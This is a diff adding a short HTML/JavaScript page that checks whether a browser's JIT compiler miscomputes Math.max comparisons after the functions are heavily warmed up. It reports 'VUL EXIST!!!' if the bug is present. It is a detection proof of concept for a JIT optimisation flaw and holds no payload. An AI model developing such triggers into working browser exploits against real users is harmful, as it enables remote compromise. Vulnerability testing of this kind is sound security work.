@@ -1,0 +1,57 @@
+123123
+<script>
+var should_be_true = true;
+
+function check(){
+    if(!should_be_true){
+		alert("VUL EXIST!!!");
+		document.write("CHECK FAILED.");
+		throw "ERROR. VUL DETECTED.";
+	}
+}
+
+
+function foo(b) {
+    let y = (new Date(42)).getMilliseconds();
+    let x = -1;
+    if (b) x = 0xFFFFFFFF;
+    return y < Math.max(1 << y, x, 1 + y);
+}
+
+should_be_true = foo(true);
+check();
+
+for (var i = 0; i < 0x10000; ++i)
+  foo(false);
+should_be_true = foo(false);
+check();
+for (var i = 0; i < 0x10000; ++i)
+  foo(false);
+should_be_true = foo(true);
+check();
+
+
+document.write("<br/>CHECK1 PASSED.<br/>");
+document.write("<br/>CHECKING POC2<br/>");
+
+function foo2(b) {
+    let x = -1;
+    if (b) x = 0xFFFFFFFF;
+    return -1 < Math.max(0, x, -1);
+}
+
+should_be_true = foo2(true);
+check();
+
+for (var i = 0; i < 0x10000; ++i)
+  foo2(false);
+should_be_true = foo2(false);
+check();
+for (var i = 0; i < 0x10000; ++i)
+  foo2(false);
+should_be_true = foo2(true);
+check();
+
+document.write("<br/>CHECK2 PASSED.");
+alert("CHECK PASSED")
+</script>
